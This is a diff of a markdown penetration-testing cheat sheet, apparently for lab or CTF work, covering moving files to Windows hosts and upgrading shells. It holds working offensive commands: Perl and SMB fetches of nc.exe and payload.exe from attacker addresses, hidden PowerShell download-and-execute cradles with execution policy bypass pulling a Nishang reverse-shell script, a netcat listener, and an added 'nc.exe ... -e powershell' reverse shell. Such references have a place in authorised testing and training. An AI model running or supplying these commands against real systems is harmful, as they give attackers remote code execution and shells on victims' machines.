@@ -251,35 +251,29 @@ python -c "import urllib.request; urllib.request.urlretrieve('http://10.10.10.10
 
 ### Uploading Files with Perl
 
-Sometimes a Windows machine will have development tools like PERL installed. Check for PERL
+- Sometimes a Windows machine will have development tools like PERL installed. Check for PERL
+  `perl -v`
 
-```
-perl -v
-```
-
-Download a file using PERL:
-
-```
-perl -le "use File::Fetch; my $ff = File::Fetch->new(uri => 'http://10.10.10.10/nc.exe'); my $file = $ff->fetch() or die $ff->error;"
-```
+- Download a file using PERL:
+  `perl -le "use File::Fetch; my $ff = File::Fetch->new(uri => 'http://10.10.10.10/nc.exe'); my $file = $ff->fetch() or die $ff->error;"`
 
 ### Uploading Files with FTP
 
 After running the python ftp lib on (`python -m pyftpdlib -p 21`) on Kali, you can try connecting using the windows FTP client:
 
-```
-C:\Users\pwnd>ftp 10.10.10.10
-Connected to 10.10.10.10
-220 pyftpdlib 1.5.3 ready.
-User (10.10.15.31:(none)): anonymous
-331 Username ok, send password.
-Password: anonymous
+  ```CMD
+  C:\Users\pwnd>ftp 10.10.10.10
+  Connected to 10.10.10.10
+  220 pyftpdlib 1.5.3 ready.
+  User (10.10.15.31:(none)): anonymous
+  331 Username ok, send password.
+  Password: anonymous
 
-230 Login successful.                                                                                                                      
-ftp> ls                                                                                                                                 
-dir                                                                                                                                       
-421 Active data channel timed out.
-```
+  230 Login successful.                                                                                                                      
+  ftp> ls                                                                                                                                 
+  dir                                                                                                                                       
+  421 Active data channel timed out.
+  ```
 
 If you are seeing a 421 timeout when you try to send a command it is likely because your connection is being blocked by the windows firewall. The Windows command-line ftp.exe supports the FTP active mode only. In the active mode, the server has to connect back to the client to establish data connection for a file transfer.
 
@@ -287,72 +281,62 @@ You can check to see if the remote machine has Winscp.exe installed. Winscp is c
 
 ### Transfering Files via SMB using Impacket
 
-Kali comes loade with the incredible Impacket library which is a swiss army knife of network protocols... just Awesome. You can easily create a SMB share on your local Kali machine and move files between Kali and Windows with ease.<br>
-<https://github.com/SecureAuthCorp/impacket>
+Kali comes loade with the incredible Impacket library which is a swiss army knife of network protocols... just Awesome. You can easily create a SMB share on your local Kali machine and move files between Kali and Windows with ease. <https://github.com/SecureAuthCorp/impacket>
 
-First we will setup the SMB Share on Kali like so:
+- First we will setup the SMB Share on Kali like so:
 
-```
-root@kali:~# impacket-smbserver root /root/Desktop
-Impacket v0.9.16-dev - Copyright 2002-2017 Core Security Technologies
+  ```shell
+  root@kali:~# impacket-smbserver root /root/Desktop
+  Impacket v0.9.16-dev - Copyright 2002-2017 Core Security Technologies
 
-[*] Config file parsed
-[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
-[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
-[*] Config file parsed
-[*] Config file parsed
-[*] Config file parsed
-```
+  [*] Config file parsed
+  [*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+  [*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+  [*] Config file parsed
+  [*] Config file parsed
+  [*] Config file parsed
+  ```
 
-Confirm it is up and running using Net View on the Windows command line:
+- Confirm it is up and running using Net View on the Windows command line:
 
-```
-C:\Users\Null>net view \\192.168.0.49
-Shared resources at \\192.168.0.49
+  ```CMD
+  C:\Users\Null>net view \\192.168.0.49
+  Shared resources at \\192.168.0.49
 
-(null)
+  (null)
 
-Share name  Type  Used as  Comment
+  Share name  Type  Used as  Comment
 
--------------------------------------------------------------------------------
-smbshare    Disk
-The command completed successfully.
-```
+  -------------------------------------------------------------------------------
+  smbshare    Disk
+  The command completed successfully.
+  ```
 
-Then we can trasnfer files from the command line as if it were a normal folder:
+- Then we can trasnfer files from the command line as if it were a normal folder:
 
-```
-C:\Users\Admin>dir \\192.168.0.49\smbshare 
-C:\Users\Admin>copy \\192.168.0.49\smbshare\loot.zip .
-```
+  ```CMD
+  C:\Users\Admin>dir \\192.168.0.49\smbshare 
+  C:\Users\Admin>copy \\192.168.0.49\smbshare\loot.zip .
+  ```
 
-By far the most interesting feature of the SMB Share method is that you can execute files directly over the SMB Share without copying them to the remote machine (fileless execution is so hot right now):
+- By far the most interesting feature of the SMB Share method is that you can execute files directly over the SMB Share without copying them to the remote machine (fileless execution is so hot right now):
+  `C:\Users\Admin>\\192.168.0.49\smbshare\payload.exe`
 
-```
-C:\Users\Admin>\\192.168.0.49\smbshare\payload.exe
-```
+- A fancy trick I learned from IPPSec is to create a mapped drive to a remote SMB share like so:
 
-A fancy trick I learned from IPPSec is to create a mapped drive to a remote SMB share like so:
-
-```
-net use y: \\192.168.0.49\smbshare  
-y: 
-dir
-```
+  ```CMD
+  net use y: \\192.168.0.49\smbshare  
+  y: 
+  dir
+  ```
 
 ## Execute a remote shell dropper
 
 Often, you can leverage PowerShell to execute a remotely hosted powershell script which contains a shell dropper (generated by the platform of your choosing).
-
-```cmd
-CMD C:\> @"%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe" -WindowStyle hidden -NonInteractive -NoProfile -InputFormat None -ExecutionPolicy Bypass -Command "iex ((New-Object System.Net.WebClient).DownloadString('http://10.10.10.10/Invoke-PowerShellTcp.ps1'))"
-```
+  `CMD C:\> @"%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe" -WindowStyle hidden -NonInteractive -NoProfile -InputFormat None -ExecutionPolicy Bypass -Command "iex ((New-Object System.Net.WebClient).DownloadString('http://10.10.10.10/Invoke-PowerShellTcp.ps1'))"`
 
 There are also some no-so-well documented PowerShell argument shortcuts so can use things like -w rather than -WindowsStyle (handy for smaller payloads):
-
-```
-CMD C:\> @"%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe" -w hidden -noni -nop -i None -ex Bypass -c "iex ((New-Object System.Net.WebClient).DownloadString('http://10.10.10.10/Invoke-PowerShellTcp.ps1'))"
-```
+  `CMD C:\> @"%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe" -w hidden -noni -nop -i None -ex Bypass -c "iex ((New-Object System.Net.WebClient).DownloadString('http://10.10.10.10/Invoke-PowerShellTcp.ps1'))"`
 
 ### Upgrading your Windows Shell
 
@@ -360,32 +344,24 @@ You might find that you are connected with a limited shell such as a Web shell, 
 
 ### Upgrade Shell with PowerShell Nishang
 
-Nishang is a framework and collection of scripts and payloads which enables usage of PowerShell for offensive security and post exploitation during Penetraion Tests. The scripts are written on the basis of requirement by the author during real Penetration Tests.
+Nishang is a framework and collection of scripts and payloads which enables usage of PowerShell for offensive security and post exploitation during Penetraion Tests. The scripts are written on the basis of requirement by the author during real Penetration Tests:
 
-```bash
-root@kali:~/test# git clone https://github.com/samratashok/nishang.git                                                  
-Cloning into 'nishang'...
-remote: Enumerating objects: 1612, done.
-remote: Total 1612 (delta 0), reused 0 (delta 0), pack-reused 1612
-Receiving objects: 100% (1612/1612), 5.87 MiB | 6.62 MiB/s, done.
-Resolving deltas: 100% (1010/1010), done.
-root@kali:~/test# cd nishang/
-root@kali:~/test/nishang# cd Shells/
-root@kali:~/test/nishang/Shells# echo Invoke-PowerShellTcp -Reverse -IPAddress 10.10.10.10 -Port 4444 >> Invoke-PowerShellTcp.ps1
-root@kali:~/test/nishang/Shells# python -m SimpleHTTPServer 80
-```
+  ```bash
+  root@kali:~/test# git clone https://github.com/samratashok/nishang.git                                                  
+  Cloning into 'nishang'...
+  remote: Enumerating objects: 1612, done.
+  remote: Total 1612 (delta 0), reused 0 (delta 0), pack-reused 1612
+  Receiving objects: 100% (1612/1612), 5.87 MiB | 6.62 MiB/s, done.
+  Resolving deltas: 100% (1010/1010), done.
+  root@kali:~/test# cd nishang/
+  root@kali:~/test/nishang# cd Shells/
+  root@kali:~/test/nishang/Shells# echo Invoke-PowerShellTcp -Reverse -IPAddress 10.10.10.10 -Port 4444 >> Invoke-PowerShellTcp.ps1
+  root@kali:~/test/nishang/Shells# python -m SimpleHTTPServer 80
+  ```
 
-Now open up a netcat listener on Kali:
-
-```bash
-nc -nlvp 4444
-```
-
-And Execute the remote powershell script hosted on your Kali SimpleHTTPServer
-
-```cmd
-CMD C:\> @"%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe" -NoProfile -InputFormat None -ExecutionPolicy Bypass -Command "iex ((New-Object System.Net.WebClient).DownloadString('http://10.10.10.10/Invoke-PowerShellTcp.ps1'))"
-```
+- Now open up a netcat listener on Kali, `nc -nlvp 4444`
+- And Execute the remote powershell script hosted on your Kali SimpleHTTPServer
+  `CMD C:\> @"%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe" -NoProfile -InputFormat None -ExecutionPolicy Bypass -Command "iex ((New-Object System.Net.WebClient).DownloadString('http://10.10.10.10/Invoke-PowerShellTcp.ps1'))"`
 
 ### Upgrade Windows Command Line with a Powershell One-liner Reverse Shell
 
@@ -397,7 +373,8 @@ CMD C:\> @"%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe" -NoProfi
 
 ### Netcat Reverseshell Oneliners for Windows
 
-Sometimes it is helpful to create a new Netcat session from an existed limited shell, webshell or unstable (short lived) remote shell.
+Sometimes it is helpful to create a new Netcat session from an existed limited shell, webshell or unstable (short lived) remote shell. If you have transfered the shell to victim box, execute:
+  `nc.exe 10.10.14.23 9001 -e powershell`
 
 # Windows Enumeration
 
